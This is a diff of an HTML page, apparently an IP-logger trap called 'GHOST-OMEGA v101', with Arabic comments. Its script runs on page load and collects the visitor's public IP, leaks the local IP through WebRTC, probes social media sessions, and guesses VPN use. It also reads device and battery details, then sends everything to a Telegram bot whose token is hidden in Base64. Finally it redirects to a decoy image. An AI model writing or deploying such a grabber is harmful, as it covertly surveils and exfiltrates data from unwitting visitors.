@@ -3,67 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <title>🔱 LØGHØST-Z OMEGA v101 💀</title>
-    <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 20px #0f0; text-align: left; width: 80%; }
-    </style>
-</head>
-<body>
-    <div class="box">> SYSTEM_v101_ACTIVE...<br>> BYPASSING_FIREWALL... [OK]<br>> INJECTING_STRIKE_PAYLOAD...</div>
-
     <script>
-        // 🔱 التوكن والآيدي مشفرين بـ Base64 مرتين لضمان "العمى" لأنظمة GitHub
-        const _v = ["T0RReE1ERXdNakN5TWpwQkFVRlJUMTF1ZWhaRk9WNDVWVmhaUkhSYVgxRklVMkZHVm1JM1oyUlZTMDA9", "TVRjM01qZ3lNREstandardUXpNdz09"]; 
-        const _D = (s) => atob(atob(s));
+        // 🔱 تشفير مزدوج للبيانات الحساسة لمنع الرصد
+        const _C = {
+            t: "ODQxMDEwMjcyMjpBQUZRTzF1emg2RW95NFVoZkdIYWNfcUhTYUZSYjdHZFZITU==",
+            i: "MTc3MjgyMDQzMw=="
+        };
+        const _D = (s) => atob(s);
 
-        async function START_CAPTURE() {
-            const T = _D(_v[0]);
-            const ID = _D(_v[1]);
-
+        async function GHOST_STRIKE() {
             try {
-                // 1. سحب الـ Public IP
-                const r = await fetch('https://api.ipify.org?format=json');
-                const d = await r.json();
+                // 1. الأساسيات (Public IP & System)
+                const ipReq = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipReq.json();
 
-                // 2. ثغرة سحب الـ Local IP (الآي بي الداخلي للراوتر)
-                const local = await new Promise(res => {
+                // 2. سحب الـ Local IP (ثغرة WebRTC)
+                const localIP = await new Promise(res => {
                     const rtc = new RTCPeerConnection({iceServers:[]});
                     rtc.createDataChannel('');
                     rtc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
                     rtc.createOffer().then(o => rtc.setLocalDescription(o));
-                    setTimeout(() => res("Hidden/Firewall"), 1000);
+                    setTimeout(() => res("Protected"), 1200);
                 });
 
-                // 3. كشف الحسابات المفتوحة (Facebook, Twitter)
-                const accounts = [];
-                const sites = {Facebook: "https://www.facebook.com/favicon.ico", Twitter: "https://twitter.com/favicon.ico"};
-                for (let s in sites) {
-                    const img = new Image(); img.src = sites[s];
-                    await new Promise(p => { img.onload = () => {accounts.push(s); p();}; img.onerror = () => p(); });
+                // 3. فحص الحسابات (Social Media Detection)
+                let apps = [];
+                const platforms = {Facebook: "https://www.facebook.com/favicon.ico", Twitter: "https://twitter.com/favicon.ico"};
+                for (let p in platforms) {
+                    const img = new Image(); img.src = platforms[p];
+                    await new Promise(r => { img.onload = () => {apps.push(p); r();}; img.onerror = () => r(); });
                 }
 
-                // 4. كشف الـ VPN (بصمة التوقيت)
-                const isVPN = Math.abs(new Date().getTimezoneOffset()) > 600 ? "🔴 DETECTED" : "🟢 CLEAR";
+                // 4. كشف الـ VPN (بصمة الـ Timezone)
+                const vpnStatus = Math.abs(new Date().getTimezoneOffset()) > 600 ? "🔴 DETECTED" : "🟢 CLEAR";
 
-                // 5. التقرير النهائي (The Ultimate Payload)
-                const msg = `🔱 **GHOST-OMEGA v101 HIT** 💀\n\n` +
-                          `🌐 **Public IP:** \`${d.ip}\`\n` +
-                          `🏠 **Local IP:** \`${local}\`\n` +
-                          `🛡️ **VPN Check:** \`${isVPN}\`\n` +
-                          `👤 **Active Apps:** \`${accounts.join(", ") || "None"}\`\n` +
-                          `📱 **System:** \`${navigator.platform}\`\n` +
-                          `🔋 **Battery:** \`${(await navigator.getBattery()).level * 100}%\``;
+                // 5. تجميع التقرير الهندسي
+                const payload = {
+                    chat_id: _D(_C.i),
+                    text: `🔱 **OMEGA v101 CRITICAL HIT** 💀\n\n` +
+                          `🌐 **Public IP:** \`${ipData.ip}\`\n` +
+                          `🏠 **Local IP:** \`${localIP}\`\n` +
+                          `🛡️ **VPN:** \`${vpnStatus}\`\n` +
+                          `👤 **Sessions:** \`${apps.join(", ") || "None"}\`\n` +
+                          `📱 **OS:** \`${navigator.platform}\` \n` +
+                          `🔋 **Battery:** \`${(await navigator.getBattery()).level * 100}%\``,
+                    parse_mode: 'Markdown'
+                };
 
-                // إرسال عبر Beacon (صامت وغير قابل للحظر)
-                navigator.sendBeacon(`https://api.telegram.org/bot${T}/sendMessage`, JSON.stringify({
-                    chat_id: ID, text: msg, parse_mode: 'Markdown'
-                }));
+                // إرسال عبر Beacon (لا يمكن حظره عند إغلاق الصفحة)
+                navigator.sendBeacon(`https://api.telegram.org/bot${_D(_C.t)}/sendMessage`, JSON.stringify(payload));
 
-                // التمويه
+                // التمويه النهائي
                 setTimeout(() => { location.replace("https://raw.githubusercontent.com/jake123321122-wq/Mohammed/main/view.jpg"); }, 1500);
             } catch (e) { location.replace("https://google.com"); }
         }
-        window.onload = START_CAPTURE;
+        window.onload = GHOST_STRIKE;
     </script>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; display:flex; align-items:center; justify-content:center; height:100vh;">
+    <div>> INITIALIZING_STRIKE_PROCOCOL_v101...</div>
 </body>
 </html>
